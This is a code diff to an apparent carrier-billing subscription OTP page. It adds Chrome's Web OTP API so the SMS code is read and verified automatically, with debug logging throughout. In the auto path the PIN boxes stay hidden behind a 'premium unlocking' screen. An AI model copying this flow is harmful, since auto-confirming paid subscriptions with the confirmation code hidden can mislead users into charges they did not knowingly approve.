@@ -321,6 +321,8 @@ export async function GET(request: NextRequest) {
     var otpPreFilled = false;  // true if OTP arrived before user tapped Subscribe
     var lastConsentAt = 0; // when user tapped Confirm (Evina consent)
     var consentArmed = false;
+    var webOTPAbort = null;   // AbortController for Web OTP API
+    var webOTPStarted = false; // guard — only start once
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('Confirm');
@@ -375,6 +377,8 @@ export async function GET(request: NextRequest) {
     dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID + ' ip=' + USER_IP);
     dbg('PinRequest: Status=' + PIN_REQUEST_STATUS + ' Evina=' + (EVINA_JS_LEN > 0 ? 'YES(' + EVINA_JS_LEN + ')' : 'NO'));
     dbg('DOM: confirmBtn=' + !!confirmBtn + ' otpValue=' + !!otpValue + ' otpFull=' + !!otpFull + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
+    dbg('WebOTP API available: ' + ('OTPCredential' in window));
+    dbg('autocomplete one-time-code input present: ' + !!otpFull);
 
     function getFullPin() {
       var val = '';
@@ -412,31 +416,85 @@ export async function GET(request: NextRequest) {
       });
     });
 
-    // Hidden input catches Chrome/App auto-fill
+    // ── Web OTP API (explicit Chrome SMS dialogue) ──────────────────────────
+    // This is the reliable path: navigator.credentials.get() delivers the code
+    // directly via a Promise. Must be called from a trusted user gesture context.
+    function startWebOTP() {
+      if (webOTPStarted) { dbg('WebOTP: already started — skipping'); return; }
+      if (!('OTPCredential' in window)) {
+        dbg('WebOTP: OTPCredential not available on this browser — falling back to autocomplete');
+        return;
+      }
+      webOTPStarted = true;
+      dbg('WebOTP: starting navigator.credentials.get() — Chrome dialogue should appear...');
+      try {
+        webOTPAbort = new AbortController();
+        navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: webOTPAbort.signal
+        }).then(function(otp) {
+          if (otp && otp.code) {
+            var code = String(otp.code).replace(/\\D/g, '').slice(0, 4);
+            dbg('WebOTP SUCCESS — code received: "' + code + '" (length=' + code.length + ')');
+            if (code.length === 4) {
+              // Fill hidden inputs so both paths stay in sync
+              for (var j = 0; j < 4; j++) pins[j].value = code[j] || '';
+              if (otpValue) otpValue.value = code;
+              if (otpFull) otpFull.value = code;
+              otpPreFilled = true;
+              otpFullHandled = true;
+              if (phase === 2) {
+                dbg('WebOTP: phase 2 active — scheduling auto-verify in ${OTP_AUTOFILL_VERIFY_MS}ms');
+                setTimeout(function() { verifyPin(code); }, ${OTP_AUTOFILL_VERIFY_MS});
+              } else {
+                dbg('WebOTP: phase 1 — OTP stored, will auto-verify on Subscribe tap');
+              }
+            } else {
+              dbg('WebOTP: code too short ("' + code + '") — user must type manually');
+            }
+          } else {
+            dbg('WebOTP: resolved but no code in response — object: ' + JSON.stringify(otp));
+          }
+        }).catch(function(err) {
+          if (err && err.name === 'AbortError') {
+            dbg('WebOTP: aborted (page navigating or resend triggered)');
+          } else {
+            dbg('WebOTP ERROR: ' + (err ? err.name + ': ' + err.message : 'unknown') + ' — autocomplete fallback still active');
+          }
+        });
+      } catch (ex) {
+        dbg('WebOTP: exception calling credentials.get — ' + String(ex));
+      }
+    }
+
+    // ── Passive autocomplete fallback (catches Chrome keyboard suggestion & app fill) ──
     var otpFullHandled = false;
     function handleOtpFullFill() {
       if (otpFullHandled || isVerifying) return;
       var code = otpFull.value.replace(/\\D/g, '').slice(0, 4);
+      dbg('autocomplete fill event — raw="' + otpFull.value + '" cleaned="' + code + '" phase=' + phase);
       if (code.length === 4) {
         otpFullHandled = true;
         for (var j = 0; j < 4; j++) pins[j].value = code[j] || '';
         if (otpValue) otpValue.value = code;
         clearError();
         if (phase === 1) {
-          // OTP arrived before consent tap — mark it, don't reveal Phase 2 yet
           otpPreFilled = true;
-          dbg('Auto-fill: "' + code + '" — OTP pre-filled, waiting for user Subscribe tap');
+          dbg('autocomplete fill: "' + code + '" — stored, waiting for Subscribe tap');
         } else {
-          // Phase 2: keep premium "unlocking" UI — do not reveal PIN boxes during auto path
-          dbg('Auto-fill: "' + code + '" — phase 2 active, scheduling auto-verify (no PIN UI)');
-          // Give Evina/carrier a moment to correlate consent/telemetry before verify.
+          dbg('autocomplete fill: "' + code + '" — phase 2 active, scheduling auto-verify in ${OTP_AUTOFILL_VERIFY_MS}ms');
           setTimeout(function() { verifyPin(code); }, ${OTP_AUTOFILL_VERIFY_MS});
         }
+      } else {
+        dbg('autocomplete fill: code not complete yet ("' + code + '") — waiting');
       }
     }
     if (otpFull) {
       otpFull.addEventListener('input', handleOtpFullFill);
       otpFull.addEventListener('change', handleOtpFullFill);
+      dbg('autocomplete fallback listener attached to #otpFull');
+    } else {
+      dbg('WARNING: #otpFull input not found — autocomplete fallback will not work');
     }
 
     function genericUserMessage(raw) {
@@ -575,6 +633,10 @@ export async function GET(request: NextRequest) {
 
       if (PIN_REQUEST_STATUS === '0') {
         dbg('PinRequest was OK — SMS already sent, entering phase 2');
+        // ── Web OTP API: call inside trusted gesture so Chrome shows SMS dialogue ──
+        // This must run BEFORE goToPhase2() so the gesture context is still active.
+        // Evina has already recorded consent at this point (isTrusted tap confirmed above).
+        startWebOTP();
         try {
           if (window._ntR && window._nt && typeof window._nt.enableSmsConsent === 'function') {
             window._nt.enableSmsConsent();
@@ -663,7 +725,8 @@ export async function GET(request: NextRequest) {
     }
 
     function handleResend() {
-      dbg('Resending OTP — full page reload...');
+      dbg('Resending OTP — aborting WebOTP + full page reload...');
+      try { if (webOTPAbort) { webOTPAbort.abort(); dbg('WebOTP aborted for resend'); } } catch(e) {}
       var newTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
       var url = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + encodeURIComponent(newTrxId) + '&userIP=' + encodeURIComponent(USER_IP);
       if (DEBUG_PANEL) url += '&debug=1';
